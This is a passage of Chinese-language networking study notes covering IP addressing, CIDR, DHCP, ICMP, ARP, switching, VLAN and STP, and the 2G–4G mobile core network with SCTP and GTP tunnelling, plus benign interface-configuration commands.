discipline</code>。内核如果需要通过某个网络接口发送数据包，它都需要按照为这个接口配置的排队规则把数据包加入队列。</p><ul><li><p><code>pfifo</code> 是最简单的规则，它不对进入的数据包做任何的处理，数据包采用先入先出的方式通过队列</p></li><li><p><code>pfifo_fast</code> 稍微复杂一些，它的队列包括三个<strong>波段</strong> <code>band</code> 。在每个波段里面，使用先进先出规则。三个波段的优先级也不相同。<code>band 0</code> 的优先级最高，<code>band 2</code> 的最低。如果 <code>band 0</code> 里面有数据包，系统就不会处理 <code>band 1</code> 里面的数据包。</p></li></ul><p>数据包是按照<strong>服务类型</strong> <code>Type of Service</code> （<code>TOS</code>）被分配到三个波段里的。TOS 是 IP 头里面的一个字段，代表了当前的包是高优先级的，还是低优先级的</p><hr><p>​</p><p>​</p><h4 id="配置-IP-地址">配置 IP 地址</h4><p><strong>net-tools：</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">sudo</span> <span class="token function">ifconfig</span> eth1 <span class="token number">10.0</span>.0.1/24$ <span class="token function">sudo</span> <span class="token function">ifconfig</span> eth1 up<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>iproute2：</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">sudo</span> <span class="token function">ip</span> addr <span class="token function">add</span> <span class="token number">10.0</span>.0.1/24 dev eth1$ <span class="token function">sudo</span> <span class="token function">ip</span> <span class="token function">link</span> <span class="token builtin class-name">set</span> up eth1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>​</p><p>  Linux 首先会判断要去的地址是一个网段的吗，或者和一个网卡是同一网段的吗？只有是一个网段的，它才会发送 ARP 请求，获取 MAC 地址。如果发现不是，**Linux 默认的逻辑是，如果这是一个跨网段的调用，便不会直接将包发送到网络上，而是企图将包发送到网关。**如果配置了网关，Linux 会获取网关的 MAC 地址，然后将包发出去。（网关要和当前的网络至少一个网卡是同一个网段的）</p><p>​</p><p>​</p><h4 id="IP-地址分类">IP 地址分类</h4><p>32 位的 IP 地址被分成了 5 类</p><p><img src="image-20210208175314831.png" alt=""></p><p>在网络地址中，对于 A、B、 C 类主要分两部分，<strong>前面一部分是网络号，后面一部分是主机号</strong>。</p><p>下面这个表格展示了 A、B、C 三类地址能包含的主机数量</p><p><img src="image-20210208180327902.png" alt=""></p><p><strong>问题</strong>： C 类地址能包含的最大主机数量实在太少了，只有 254 个，而 B 类地址能包含的最大主机数量又太多了，6 万多台机器放在一个网络下面，一般的企业基本达不到这个规模，闲着的地址就是浪费。</p><p>一个折中的方式叫作<strong>无类型域间选路</strong></p><p>​</p><p>​</p><h4 id="公有-私有-IP-地址">公有/私有 IP 地址</h4><p>  上面的表格最右列是私有 IP 地址段。平时看到的数据中心里，办公室、家里或学校的 IP 地址，一般都是私有 IP 地址段。因为这些地址允许组织内部的 IT 人员自己管理、自己分配，而且可以重复。但是出了内网就需要使用公有 IP 地址。</p><p>  表格中的 <strong>192.168.0.x</strong> 是最常用的私有 IP 地址。家里有 Wi-Fi，对应就会有一个 IP 地址。一般家中上网设备不会超过 256 个，所以 /24 基本就够了。 <strong>192.168.0</strong> 是网络号，后面是主机号。而整个网络里面的第一个地址 <strong>192.168.0.1</strong> 往往就是私有网络的出口地址。例如家里的电脑连接 Wi-Fi，Wi-Fi 路由器的地址就是 <strong>192.168.0.1</strong>，而 <strong>192.168.0.255</strong> 就是广播地址。一旦发送这个地址，整个 <strong>192.168.0</strong> 网络里面的所有机器都能收到。</p><p>​</p><p>​</p><h4 id="无类型域间选路-CIDR">无类型域间选路 <code>CIDR</code></h4><p>  CIDR打破了原来设计的几类地址的做法，将 32 位的 IP 地址一分为二，前面是<strong>网络号</strong>，后面是<strong>主机号</strong>。如 IP地址 <strong>10.100.122.2/24</strong>，这种地址表示形式就是 CIDR。 24 的意思是：32 位中前 24 位是网络号，后 8 位是主机号。</p><p>  伴随 CIDR 存在的，一个是<strong>广播地址</strong>，如果发送地址<strong>10.100.122.255</strong>，所有 <strong>10.100.122</strong> 网络里面的机器都可以收到。另一个是<strong>子网掩码</strong>，**将子网掩码和 IP 地址按位计算 AND，就可得到网络号。**将子网掩码 <strong>255.255.255.0</strong> 和 IP 地址进行 AND 计算为 <strong>10.100.122.0</strong></p><p>​</p><p>​</p><h4 id="动态主机配置协议-DHCP">动态主机配置协议 <code>DHCP</code></h4><p>  客户端的机器每次使用都要配置 IP 地址怎么办？因此需要有一个自动配置的协议。</p><p>  <strong>动态主机配置协议</strong>（<code>Dynamic Host Configuration Protocol，DHCP</code>）主要是用来给客户租用 IP 地址，网络管理员只需要配置一段共享的 IP 地址。每一台新接入的机器都通过 DHCP 协议，来这个共享的 IP 地址里申请，然后自动配置好，用完了还回去。DHCP 协议能给客户推荐<code>PXE</code>帮助安装操作系统，在云计算领域大有用处。</p><p>​</p><p>​</p><h2 id="ICMP">ICMP</h2><p>  <strong>ICMP</strong>全称是 <code>Internet Control Message Protocol</code> ，就是<strong>互联网控制报文协议</strong>。是一种基于 IP 协议的控制协议。网络包在异常复杂的网络环境中传输时，常常会遇到各种各样的问题。当遇到问题的时候，要传出消息来报告情况，调整传输策略。</p><p>  <strong>ICMP 报文封装在 IP 包里面</strong>。因为传输指令的时候需要源地址和目标地址。</p><p><img src="image-20210405175650430.png" alt="ICMP 报文"></p><p>ICMP 在 IP 报文后加入了新的内容，这些内容包括：</p><ul><li>类型：ICMP 报文有很多的类型，不同的类型有不同的代码，其中 ping 的请求类型为 8（主动请求），应答为 0</li><li>代码：进一步划分 ICMP 的类型, 用来查找产生错误的原因</li><li>校验和：用于检查错误的数据</li></ul><p>​</p><p>​</p><h3 id="查询报文类型">查询报文类型</h3><p>  例如，<strong>ping 就是查询报文，是一种主动请求，并且获得主动应答的 ICMP 协议。</strong></p><p>  对 ping 的主动请求进行网络抓包，称为<strong>ICMP ECHO REQUEST。<strong>同理主动请求的回复称为</strong>ICMP ECHO REPLY</strong>。比起原生的 ICMP，这里面多了两个字段：<strong>标识符、顺序号</strong>。<strong>顺序号</strong>主要用于区分连续 ping 的时候发出的多个数据包。每发出一个请求数据包，顺序号会自动加 1。为了能够计算往返时间 RTT，它会在报文的数据部分插入发送时间。</p><p>  在选项数据中，ping 还会在报文的数据部分插入发送时间，来计算往返时间，说明路程的长短。</p><p>​</p><p>​</p><h3 id="差错报文类型">差错报文类型</h3><p>  异常情况发起的，来报告发生了不好的事情，对应 ICMP 的<strong>差错报文类型</strong>。<strong>终点不可达为 3，源抑制为 4，超时为 11，重定向为 5</strong>。</p><ul><li><p><strong>源站抑制</strong>，也就是让源站放慢发送速度。</p></li><li><p><strong>时间超时</strong>，也就是超过网络包的生存时间还是没到。</p></li><li><p><strong>路由重定向</strong>，也就是让下次发给另一个路由器。</p></li></ul><p>  差错报文的结构前面还是 IP，ICMP 的前 8 字节不变，后面则跟上出错的那个 IP 包的 IP 头和 IP 正文的前 8 个字节。</p><p>​</p><p>​</p><h3 id="ping：查询报文类型的使用">ping：查询报文类型的使用</h3><p><img src="image-20210405185245423.png" alt=""></p><p>  ping 命令执行的时候，源主机首先会构建一个 <strong>ICMP 请求数据包</strong>，ICMP 数据包内包含多个字段。然后，由 ICMP 协议将这个数据包连同地址 <strong>192.168.1.2</strong> 一起交给 IP 层构建一个 IP 数据包。</p><p>  IP 报文通过 ARP 协议，源地址和目的地址被翻译成 MAC 地址，由数据链路层构建一个数据帧后（目的地址是 IP 层传过来的 MAC 地址，源地址则是本机的 MAC 地址），依据以太网的介质访问规则，报文被传输出去。</p><p>  当报文到达目的地址之后，目的地址所在的主机也按照 ICMP 协议进行应答。主机 B 会构建一个 <strong>ICMP 应答包</strong>，应答数据包的类型字段为 0，顺序号为接收到的请求数据包中的顺序号，然后再发送出去给主机 A。</p><p>  应答数据到达源地址之后，ping 命令可以通过再次<strong>解析 ICMP 报文，对比序列号，计算时间戳等</strong>来完成每个发送 - 应答的显示。</p><hr><p>  如果跨网段的话，还会涉及网关的转发、路由器的转发等等。但是对于 ICMP 的头来讲是没什么影响的。</p><p>  如果在自己的可控范围之内，遇到网络不通时，除了直接 ping 目标的 IP 地址之外，应该要清楚地知道一个网络包从源地址到目标地址都经过了哪些设备，然后逐个 ping 中间的这些设备。如果可能的话，在关键点通过 <strong>tcpdump</strong> 查看包有没有到达某个点，回复的包到达了哪个点。</p><p>  如果不在我们的控制范围内，很多中间设备都是禁止 ping 的。这个时候就要使用 <strong>telnet</strong>，或其他协议来测试网络是否通。</p><p>​</p><p>​</p><h3 id="Traceroute：差错报文类型的使用">Traceroute：差错报文类型的使用</h3><p>  Traceroute会使用 ICMP 的规则，故意制造一些能够产生错误的场景。</p><ul><li><p><strong>故意设置特殊的 TTL ，来追踪去往目的地时沿途经过的路由器</strong>。发送一份<strong>TTL字段为1</strong>的 UDP 数据包给目的主机，处理这个数据包的第一个路由器将TTL值减1，然后丢弃该数据包，并给源主机发送一个ICMP报文（<strong>时间超时</strong>，这个报文包含了路由器的IP地址，这样就得到了第一个路由器的地址），然后发送一个TTL为2的数据报来得到第二个路由器的IP地址，继续这个过程，直至这个数据报到达目的主机。（有的路由器不会回 ICMP，这也是 Traceroute 一个公网的地址看不到中间路由的原因）</p><blockquote><p>怎么知道 UDP 到达了目的主机？</p><p>发送一份 UDP 数据报给目的主机，但选择一个大于 30000的值作为 UDP 端口号。当该数据报到达时，将使目的主机的 UDP 模块产生一份<strong>端口不可达</strong>错误 ICMP 报文。如果数据报没有到达，则可能是超时。</p></blockquote></li><li><p><strong>故意设置不分片，从而确定路径的 MTU。<strong>首先发送分组，并设置“不分片”标志。发送的第一个分组的长度正好与出口 MTU 相等。如果中间遇到窄的关口会被卡住，会发送 ICMP 网络差错包，类型为</strong>需要进行分片但设置了不分片位</strong>。每次收到 ICMP不能分片差错时就减小分组的长度，直到到达目标主机。</p></li></ul><p>​</p><blockquote><p>当发送的报文出问题的时候，会发送一个 ICMP 的差错报文来报告错误，但是如果 ICMP 的差错报文也出问题了呢？</p></blockquote><p>​</p><p>​</p><h2 id="路由协议">路由协议</h2><h2 id="ARP">ARP</h2><h2 id="RARP">RARP</h2><p>​</p><p>​</p><h1>链路层</h1><p>  几台电脑可以通过集线器连接成一个小的局域网。集线器完全在物理层工作，它会将自己收到的每一个字节，都复制到其他端口上去。</p><p>如果每一台电脑发出的包，每个电脑都能收到，这需要解决几个问题：</p><ol><li>这个包是发给谁的？谁应该接收？</li><li>会不会产生混乱？有没有先后规则？</li><li>如果发送的时候出现了错误怎么办？</li></ol><hr><p>  MAC层要控制在往媒体上发数据时的先后问题，防止发生混乱，解决了媒体接入控制的问题。这个问题中的规则叫<strong>多路访问</strong>。有很多算法可以解决这个问题，比如<strong>信道划分</strong>、<strong>轮流协议</strong>、<strong>随机接入协议</strong>。</p><p>  解决第一个问题要用到一个物理地址，叫作<strong>链路层地址。<strong>但是因为第二层主要解决媒体接入控制的问题，所以它常被称为</strong>MAC 地址</strong>。</p><p><img src="image-20210208214737970.png" alt="第二层的网络包格式"></p><p>  有了目标 MAC 地址，数据包在链路上广播，MAC 的网卡才能发现这个包是给它的。返回的时候，源 MAC 就变成了目标 MAC，再返给请求的机器。</p><p>  对于以太网，第二层的最后面是<strong>CRC</strong>，也就是<strong>循环冗余检测</strong>。通过 XOR 异或的算法，来计算整个包是否在发送的过程中出现了错误，主要解决第三个问题。</p><p>  如果源机器不知道目标机器的地址，就会用到<strong>ARP 协议</strong></p><p>​</p><p>​</p><h2 id="ARP-2">ARP</h2><blockquote><p>已知 IP 地址，求 MAC 地址的协议</p></blockquote><p><img src="image-20210208215910970.png" alt=""></p><p>在一个局域网里面，当知道了 IP 地址，不知道 MAC 怎么办呢？靠广播</p><p><img src="image-20210208220005626.png" alt=""></p><p>广而告之，发送一个广播包，谁是这个 IP 谁来回答。具体询问和回答的报文就像下面这样：</p><p><img src="image-20210208220045779.png" alt=""></p><p>为了避免每次都用 ARP 请求，机器本地也会进行 ARP 缓存。机器会不断地上线下线，IP 也可能会变，所以 ARP 的 MAC 地址缓存过一段时间会过期。</p><p>​</p><blockquote><p>  RARP 协议：已知 MAC 求 IP</p><ul><li><p>无盘工作站无法持久化IP地址到本地，但有网卡，所以可以用RARP协议来获取IP地址</p></li><li><p>RARP可以用于局域网管理员想指定机器IP，又不想每台机器去设置静态IP的情况，可以在RARP服务器上配置MAC和IP对应的ARP表</p></li></ul></blockquote><p>​</p><p>​</p><h2 id="交换机">交换机</h2><blockquote><p><strong>检查目标 MAC 地址</strong>，然后根据策略转发的设备。</p></blockquote><p>  一台 MAC1 电脑将一个包发送给另一台 MAC2 电脑，当这个包到达交换机的时候，一开始交换机也不知道 MAC2 的电脑在哪个口，它只能将包转发给除了来的那个口之外的其他所有的口。但是，这时交换机会记住，MAC1 是来自一个明确的口。</p><p>  过了一段时间之后，就有了整个网络的一个结构了，这个时候，基本上不用广播了，全部可以准确转发。每个机器的 IP 地址会变，所在的口也会变，因而交换机上的学习的结果，称为<strong>转发表</strong>，是有一个过期时间的。</p><p>​</p><h3 id="拓扑结构">拓扑结构</h3><p>  在复杂的场景下如办公室，一个交换机不够用，需要多台交换机，交换机之间连接起来，这就形成一个<strong>拓扑结构</strong></p><hr><p><img src="image-20210208230459151.png" alt="两台交换机"></p><p>  上图中两台交换机连接三个局域网，每个局域网上有多台机器</p><p>  如果机器 1 只知道机器 4 的 IP 地址，当它想要访问机器 4 把包发出去的时候，必须要知道机器 4 的 MAC 地址，于是机器 1 发起广播。交换机 A 一开始不知道任何拓扑信息，在收到广播后采取的策略是：**除了广播包来的方向外，它还要转发给其他所有的网口。**交换机 B 同理，将包转发到 LAN3 。机器 4 收到了广播信息，主动响应 MAC 地址，<strong>一个 ARP 请求完成</strong>。</p><p>  交换机了解到拓扑信息后，情况就好转起来。</p><p>  当机器 3 要访问机器 1 时也需要发起一个广播的 ARP 请求。交换机 A 和 B 都能够收到这个请求。交换机 A 知道主机 1 是在左边网口，所以会把广播消息转发到 LAN1 。交换机 B 则不会将消息广播到 LAN3 。</p><hr><p>  当交换机的数目越来越多时，交换机之间为了冗余、带宽提升、或错误连接难免会产生一个封闭的物理环路，遭遇<strong>环路问题</strong>，产生广播风暴（网络包迷路，一个包转来转去，每台机器都会发广播包，交换机转发也会复制广播包，当广播包越来越多的时候，路会越来越堵）这就需要使用 <strong>STP 协议，将有环路的图变成没有环路的树</strong>。将物理上存在环路的网络，通过算法在逻辑上阻塞一些端口。</p><p><img src="image-20210405164240615.png" alt=""></p><blockquote><p>STP缺点：一个是某个交换机状态发生变化的时候，整个树需要重新构建；被破开的环的链路被浪费了</p></blockquote><p>​</p><p>​</p><h3 id="VLAN">VLAN</h3><p>  交换机数目多会面临<strong>隔离问题</strong>，可以通过 VLAN 形成<strong>虚拟局域网</strong>，从而解决<strong>广播问题和安全问题</strong>。</p><p>  交换机可以设置交换机每个口所属的 VLAN，且可以重新设置。交换机区分局域网只需要在原来的二层的头上加一个 <code>TAG</code>，其中有一个12 位的 <code>VLAN ID</code>（<strong>可以划分 4096 个 VLAN</strong>）。如果交换机支持 VLAN ，取下二层的头时，就能够识别 VLAN ID 。只有<strong>相同 VLAN 的包，才会互相转发</strong>，不同 VLAN 的包是看不到的。</p><p><img src="image-20210208225008078.png" alt=""></p><p>  对于支持 VLAN 的交换机，交换机之间可以使用<strong>Trunk 口</strong>连接。它可以转发属于任何 VLAN 的口。</p><p><img src="image-20210208225350460.png" alt=""></p><p>​</p><p>​</p><h2 id="STP">STP</h2><blockquote><p>概念：</p><ul><li><strong>Root Bridge</strong>，<strong>根交换机</strong>。是某棵树的老大。</li><li><strong>Designated Bridges</strong>，<strong>指定交换机</strong>。就是一棵树的树枝。</li><li><strong>Bridge Protocol Data Units （BPDU）</strong> ，<strong>网桥协议数据单元</strong>。交换机相连的时候，就需要“相互比较实力”。BPDU 只有根交换机能发。</li><li><strong>Priority Vector</strong>，<strong>优先级向量</strong>。[Root Bridge ID, Root Path Cost, Bridge ID, and Port ID]。先看 Root Bridge ID，再比 Root Path Cost，也即距离老大的距离，最后比 Bridge ID，拿自己的本事比。</li></ul></blockquote><p>生成树协议运行生成树算法过程可以归纳为以下三个步骤：</p><ol><li>选择根交换机</li><li>选择根端口</li><li>选择指定端口</li></ol><p>​</p><p>​</p><h1>移动网络</h1><h2 id="2G-网络">2G 网络</h2><p>手机本来是用来打电话的而不是用来上网的，在 2G 时代上网使用的不是 IP 网络而是<strong>电话网络</strong>，走模拟信号，专业名称为公共交换电话网<code>Public Switched Telephone Network</code>（<code>PSTN</code>）</p><p>手机是通过收发无线信号来通信的，专业名称是 Mobile Station，简称 MS，需要嵌入 SIM。手机是客户端，而无线信号的服务端，就是基站子系统（BSS，Base Station SubsystemBSS）。至于什么是基站，你可以回想一下，你在爬山的时候，是不是看到过信号塔？我们平时城市里面的基站比较隐蔽，不容易看到，所以只有在山里才会注意到。正是这个信号塔，通过无线信号，让你的手机可以进行通信。</p><p><strong>无论无线通信如何无线，最终还是要连接到有线的网络里</strong>。前面讲数据中心的时候我也讲过，电商的应用是放在数据中心的，数据中心的电脑都是插着网线的。</p><p>因而，基站子系统分两部分，一部分对外提供无线通信，叫作基站收发信台（BTS，Base Transceiver Station），另一部分对内连接有线网络，叫作基站控制器（BSC，Base Station Controller）。基站收发信台通过无线收到数据后，转发给基站控制器。</p><p>这部分属于无线的部分，统称为无线接入网（RAN，Radio Access Network）。</p><p>基站控制器通过有线网络，连接到提供手机业务的运营商的数据中心，这部分称为核心网（CN，Core Network）。核心网还没有真的进入互联网，这部分还是主要提供手机业务，是手机业务的有线部分。</p><p>首先接待基站来的数据的是移动业务交换中心（MSC，Mobile Service Switching Center），它是进入核心网的入口，但是它不会让你直接连接到互联网上。</p><p>因为在让你的手机真正进入互联网之前，提供手机业务的运营商，需要认证是不是合法的手机接入。别你自己造了一张手机卡，就连接上来。鉴权中心（AUC，Authentication Center）和设备识别寄存器（EIR，Equipment Identity Register）主要是负责安全性的。</p><p>另外，需要看你是本地的号，还是外地的号，这个牵扯到计费的问题，异地收费还是很贵的。访问位置寄存器（VLR，Visit Location Register）是看你目前在的地方，归属位置寄存器（HLR，Home Location Register）是看你的号码归属地。</p><p>当你的手机卡既合法又有钱的时候，才允许你上网，这个时候需要一个网关，连接核心网和真正的互联网。网关移动交换中心（GMSC ，Gateway Mobile Switching Center）就是干这个的，然后是真正的互连网。在 2G 时代，还是电话网络 PSTN。</p><p>数据中心里面的这些模块统称为网络子系统（NSS，Network and Switching Subsystem）。</p><h3 id="2-5G-网络">2.5G 网络</h3><p>后来从 2G 到了 2.5G，也即在原来电路交换的基础上，加入了分组交换业务，支持 Packet 的转发，从而支持 IP 网络。</p><p>在上述网络的基础上，基站一面朝前接无线，一面朝后接核心网。在朝后的组件中，多了一个分组控制单元（PCU，Packet Control Unit），用以提供分组交换通道。</p><p>在核心网里面，有个朝前的接待员（SGSN，Service GPRS Supported Node）和朝后连接 IP 网络的网关型 GPRS 支持节点（GGSN，Gateway GPRS Supported Node）。3G 网络</p><p>到了 3G 时代，主要是无线通信技术有了改进，大大增加了无线的带宽。</p><p>以 W-CDMA 为例，理论最高 2M 的下行速度，因而基站改变了，一面朝外的是 Node B，一面朝内连接核心网的是无线网络控制器（RNC，Radio Network Controller）。核心网以及连接的 IP 网络没有什么变化。</p><h3 id="4G-网络">4G 网络</h3><p>然后就到了今天的 4G 网络，基站为 eNodeB，包含了原来 Node B 和 RNC 的功能，下行速度向百兆级别迈进。另外，核心网实现了控制面和数据面的分离，这个怎么理解呢？</p><p>在前面的核心网里面，有接待员 MSC 或者 SGSN，你会发现检查是否合法是它负责，转发数据也是它负责，也即控制面和数据面是合二为一的，这样灵活性比较差，因为控制面主要是指令，多是小包，往往需要高的及时性；数据面主要是流量，多是大包，往往需要吞吐量。</p><p>于是有了下面这个架构。HSS 用于存储用户签约信息的数据库，其实就是你这个号码归属地是哪里的，以及一些认证信息。</p><p>MME 是核心控制网元，是控制面的核心，当手机通过 eNodeB 连上的时候，MME 会根据 HSS 的信息，判断你是否合法。如果允许连上来，MME 不负责具体的数据的流量，而是 MME 会选择数据面的 SGW 和 PGW，然后告诉 eNodeB，我允许你连上来了，你连接它们吧。</p><p>于是手机直接通过 eNodeB 连接 SGW，连上核心网，SGW 相当于数据面的接待员，并通过 PGW 连到 IP 网络。PGW 就是出口网关。在出口网关，有一个组件 PCRF，称为策略和计费控制单元，用来控制上网策略和流量的计费。</p><h2 id="4G-网络协议解析">4G 网络协议解析</h2><p>我们来仔细看一下 4G 网络的协议，真的非常复杂。我们将几个关键组件放大来看。</p><h3 id="控制面协议">控制面协议</h3><p>其中虚线部分是控制面的协议。当一个手机想上网的时候，先要连接 eNodeB，并通过 S1-MME 接口，请求 MME 对这个手机进行认证和鉴权。S1-MME 协议栈如下图所示。</p><p>UE 就是你的手机，eNodeB 还是两面派，朝前对接无线网络，朝后对接核心网络，在控制面对接的是 MME。</p><p>eNodeB 和 MME 之间的连接就是很正常的 IP 网络，但是这里面在 IP 层之上，却既不是 TCP，也不是 UDP，而是 SCTP。这也是传输层的协议，也是面向连接的，但是更加适合移动网络。 它继承了 TCP 较为完善的拥塞控制并改进 TCP 的一些不足之处。</p><p>SCTP 的第一个特点是<strong>多宿主</strong>。一台机器可以有多个网卡，而对于 TCP 连接来讲，虽然服务端可以监听 0.0.0.0，也就是从哪个网卡来的连接都能接受，但是一旦建立了连接，就建立了四元组，也就选定了某个网卡。</p><p>SCTP 引入了联合（association）的概念，将多个接口、多条路径放到一个联合中来。当检测到一条路径失效时，协议就会通过另外一条路径来发送通信数据。应用程序甚至都不必知道发生了故障、恢复，从而提供更高的可用性和可靠性。</p><p>SCTP 的第二个特点是<strong>将一个联合分成多个流</strong>。一个联合中的所有流都是独立的，但均与该联合相关。每个流都给定了一个流编号，它被编码到 SCTP 报文中，通过联合在网络上传送。在 TCP 的机制中，由于强制顺序，导致前一个不到达，后一个就得等待，SCTP 的多个流不会相互阻塞。</p><p>SCTP 的第三个特点是<strong>四次握手，防止 SYN 攻击</strong>。在 TCP 中是三次握手，当服务端收到客户的 SYN 之后，返回一个 SYN-ACK 之前，就建立数据结构，并记录下状态，等待客户端发送 ACK 的 ACK。当恶意客户端使用虚假的源地址来伪造大量 SYN 报文时，服务端需要分配大量的资源，最终耗尽资源，无法处理新的请求。</p><p>SCTP 可以通过四次握手引入 Cookie 的概念，来有效地防止这种攻击的产生。在 SCTP 中，客户机使用一个 INIT 报文发起一个连接。服务器使用一个 INIT-ACK 报文进行响应，其中就包括了 Cookie。然后客户端就使用一个 COOKIE-ECHO 报文进行响应，其中包含了服务器所发送的 Cookie。这个时候，服务器为这个连接分配资源，并通过向客户机发送一个 COOKIE-ACK 报文对其进行响应。</p><p>SCTP 的第四个特点是<strong>将消息分帧</strong>。TCP 是面向流的，也即发送的数据没头没尾，没有明显的界限。这对于发送数据没有问题，但是对于发送一个个消息类型的数据，就不太方便。有可能客户端写入 10 个字节，然后再写入 20 个字节。服务端不是读出 10 个字节的一个消息，再读出 20 个字节的一个消息，而有可能读入 25 个字节，再读入 5 个字节，需要业务层去组合成消息。</p><p>SCTP 借鉴了 UDP 的机制，在数据传输中提供了消息分帧功能。当一端对一个套接字执行写操作时，可确保对等端读出的数据大小与此相同。</p><p>SCTP 的第五个特点是<strong>断开连接是三次挥手</strong>。在 TCP 里面，断开连接是四次挥手，允许另一端处于半关闭的状态。SCTP 选择放弃这种状态，当一端关闭自己的套接字时，对等的两端全部需要关闭，将来任何一端都不允许再进行数据的移动了。</p><p>当 MME 通过认证鉴权，同意这个手机上网的时候，需要建立一个数据面的数据通路。建立通路的过程还是控制面的事情，因而使用的是控制面的协议 GTP-C。</p><p>建设的数据通路分两段路，其实是两个隧道。一段是从 eNodeB 到 SGW，这个数据通路由 MME 通过 S1-MME 协议告诉 eNodeB，它是隧道的一端，通过 S11 告诉 SGW，它是隧道的另一端。第二端是从 SGW 到 PGW，SGW 通过 S11 协议知道自己是其中一端，并主动通过 S5 协议，告诉 PGW 它是隧道的另一端。</p><p>GTP-C 协议是基于 UDP 的，这是<a href="https://time.geekbang.org/column/article/8924">UDP 的“城会玩”</a>中的一个例子。如果看 GTP 头，我们可以看到，这里面有隧道的 ID，还有序列号。</p><p>通过序列号，不用 TCP，GTP-C 自己就可以实现可靠性，为每个输出信令消息分配一个依次递增的序列号，以确保信令消息的按序传递，并便于检测重复包。对于每个输出信令消息启动定时器，在定时器超时前未接收到响应消息则进行重发。</p><h4 id="数据面协议">数据面协议</h4><p>当两个隧道都打通，接在一起的时候，PGW 会给手机分配一个 IP 地址，这个 IP 地址是隧道内部的 IP 地址，可以类比为 IPsec 协议里面的 IP 地址。这个 IP 地址是归手机运营商管理的。然后，手机可以使用这个 IP 地址，连接 eNodeB，从 eNodeB 经过 S1-U 协议，通过第一段隧道到达 SGW，再从 SGW 经过 S8 协议，通过第二段隧道到达 PGW，然后通过 PGW 连接到互联网。</p><p>数据面的协议都是通过 GTP-U，如图所示。</p><p>手机每发出的一个包，都由 GTP-U 隧道协议封装起来，格式如下。</p><p>和 IPsec 协议很类似，分为乘客协议、隧道协议、承载协议。其中乘客协议是手机发出来的包，IP 是手机的 IP，隧道协议里面有隧道 ID，不同的手机上线会建立不同的隧道，因而需要隧道 ID 来标识。承载协议的 IP 地址是 SGW 和 PGW 的 IP 地址。</p><h4 id="手机上网流程">手机上网流程</h4><p>接下来，我们来看一个手机开机之后上网的流程，这个过程称为<strong>Attach</strong>。可以看出来，移动网络还是很复杂的。因为这个过程要建立很多的隧道，分配很多的隧道 ID，所以我画了一个图来详细说明这个过程。</p><ol><li>手机开机以后，在附近寻找基站 eNodeB，找到后给 eNodeB 发送 Attach Request，说“我来啦，我要上网”。</li><li>eNodeB 将请求发给 MME，说“有个手机要上网”。</li><li>MME 去请求手机，一是认证，二是鉴权，还会请求 HSS 看看有没有钱，看看是在哪里上网。</li><li>当 MME 通过了手机的认证之后，开始分配隧道，先告诉 SGW，说要创建一个会话（Create Session）。在这里面，会给 SGW 分配一个隧道 ID t1，并且请求 SGW 给自己也分配一个隧道 ID。</li><li>SGW 转头向 PGW 请求建立一个会话，为 PGW 的控制面分配一个隧道 ID t2，也给 PGW 的数据面分配一个隧道 ID t3，并且请求 PGW 给自己的控制面和数据面分配隧道 ID。</li><li>PGW 回复 SGW 说“创建会话成功”，使用自己的控制面隧道 ID t2，回复里面携带着给 SGW 控制面分配的隧道 ID t4 和控制面的隧道 ID t5，至此 SGW 和 PGW 直接的隧道建设完成。双方请求对方，都要带着对方给自己分配的隧道 ID，从而标志是这个手机的请求。</li><li>接下来 SGW 回复 MME 说“创建会话成功”，使用自己的隧道 ID t1 访问 MME，回复里面有给 MME 分配隧道 ID t6，也有 SGW 给 eNodeB 分配的隧道 ID t7。</li><li>当 MME 发现后面的隧道都建设成功之后，就告诉 eNodeB，“后面的隧道已经建设完毕，SGW 给你分配的隧道 ID 是 t7，你可以开始连上来了，但是你也要给 SGW 分配一个隧道 ID”。</li><li>eNodeB 告诉 MME 自己给 SGW 分配一个隧道，ID 为 t8。</li><li>MME 将 eNodeB 给 SGW 分配的隧道 ID t8 告知 SGW，从而前面的隧道也建设完毕。</li></ol><p>这样，手机就可以通过建立的隧道成功上网了。</p><h4 id="异地上网问题">异地上网问题</h4><p>接下来我们考虑异地上网的事情。</p><p>为什么要分 SGW 和 PGW 呢，一个 GW 不可以吗？SGW 是你本地的运营商的设备，而 PGW 是你所属的运营商的设备。</p><p>如果你在巴塞罗那，一下飞机，手机开机，周围搜寻到的肯定是巴塞罗那的 eNodeB。通过 MME 去查寻国内运营商的 HSS，看你是否合法，是否还有钱。如果允许上网，你的手机和巴塞罗那的 SGW 会建立一个隧道，然后巴塞罗那的 SGW 和国内运营商的 PGW 建立一个隧道，然后通过国内运营商的 PGW 上网。这样判断你是否能上网的在国内运营商的 HSS，控制你上网策略的是国内运营商的 PCRF，给手机分配的 IP 地址也是国内运营商的 PGW 负责的，给手机分配的 IP 地址也是国内运营商里统计的。运营商由于是在 PGW 里面统计的，这样你的上网流量全部通过国内运营商即可，只不过巴塞罗那运营商也要和国内运营商进行流量结算。</p><p>由于你的上网策略是由国内运营商在 PCRF 中控制的，因而你还是上不了脸书。</p><p>好了，这一节就到这里了，我们来总结一下：</p><ul><li>移动网络的发展历程从 2G 到 3G，再到 4G，逐渐从打电话的功能为主，向上网的功能为主转变；</li><li>请记住 4G 网络的结构，有 eNodeB、MME、SGW、PGW 等，分控制面协议和数据面协议，你可以对照着结构，试着说出手机上网的流程；</li><li>即便你在国外的运营商下上网，也是要通过国内运营商控制的，因而也上不了脸书。</li></ul><p>最后，给你留两个思考题：</p><ol><li>咱们上网都有套餐，有交钱多的，有交钱少的，你知道移动网络是如何控制不同优先级的用户的上网流量的吗？</li><li>前面讲过的所有的网络都是基于物理机的，随着云计算兴起，无论是电商，还是移动网络都要部署在云中了，你知道云中网络的设计有哪些要点吗？</li></ol><h2 id="云计算">云计算</h2><h3 id="软件定义网络">软件定义网络</h3><p>​</p><p>​</p><h2 id="容器">容器</h2><p>​</p><p>​</p><h1>微服务</h1><h2 id="RPC">RPC</h2><p>RPC（<code>Remote Procedure Call</code>），远程过程调用协议，是分布式系统常见的一种通信方法。</p><p>当两个物理分离的子系统需要建立逻辑上的关联时，RPC 是牵线搭桥的常见技术手段之一。</p><p>除 RPC 之外，常见的多系统数据交互方案还有分布式消息队列、HTTP 请求调用、数据库和分布式缓存等</p><p>早期 ONC RPC 框架</p><p>服务之间的互相调用，该怎么实现呢？</p><h3 id="概述-7">概述</h3><p><a href="zotero://open-pdf/library/items/LH2Q89FF">Implementing remote 